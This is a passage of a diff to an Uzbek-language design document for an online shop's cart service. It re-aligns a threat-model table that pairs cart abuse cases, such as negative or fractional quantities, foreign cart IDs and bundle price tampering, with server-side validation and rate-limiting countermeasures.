-| **Boshqa savatga qo'shish** | `cartId` **mijozdan olinmaydi** — sessiya/cookie'dan (§3.4) |
-| **Mavjud bo'lmagan variant** | FK constraint + `findFirst` bilan tekshiruv |
-| **Nofaol variant** (`isActive: false`) | Savatga qo'shishda **va** checkout'da qayta tekshiriladi |
-| **Bundle narxini buzish** | Bundle tarkibi serverda, `bundleId` bo'yicha olinadi (`docs/05`) |
-| **Savat spam** (DoS) | Savatda maks N pozitsiya + rate limiting (§8.3) |
+| Hujum                                          | Chora                                                                                         |
+| ---------------------------------------------- | --------------------------------------------------------------------------------------------- |
+| **Manfiy miqdor** (`qty: -5` → summa kamayadi) | `@Min(1)`. **`@IsInt()` ham shart** — `qty: 0.5` float bilan narx bo'linadi                   |
+| **Ulkan miqdor** (`qty: 999999`)               | `@Max(999)` + qoldiq tekshiruvi (`docs/06`). `BigInt` overflow — kanon §8 tufayli muammo emas |
+| **Boshqa savatga qo'shish**                    | `cartId` **mijozdan olinmaydi** — sessiya/cookie'dan (§3.4)                                   |
+| **Mavjud bo'lmagan variant**                   | FK constraint + `findFirst` bilan tekshiruv                                                   |
+| **Nofaol variant** (`isActive: false`)         | Savatga qo'shishda **va** checkout'da qayta tekshiriladi                                      |
+| **Bundle narxini buzish**                      | Bundle tarkibi serverda, `bundleId` bo'yicha olinadi (`docs/05`)                              |
+| **Savat spam** (DoS)                           | Savatda maks N pozitsiya + rate limiting (§8.3)                                               |
 
 > **`@IsInt()` haqida alohida:** `qty: 0.5` yuborilsa va validatsiya faqat
 > `@Min(1)` bo'lsa — `0.5` o'tmaydi. Lekin `qty: 1.5` o'tadi va
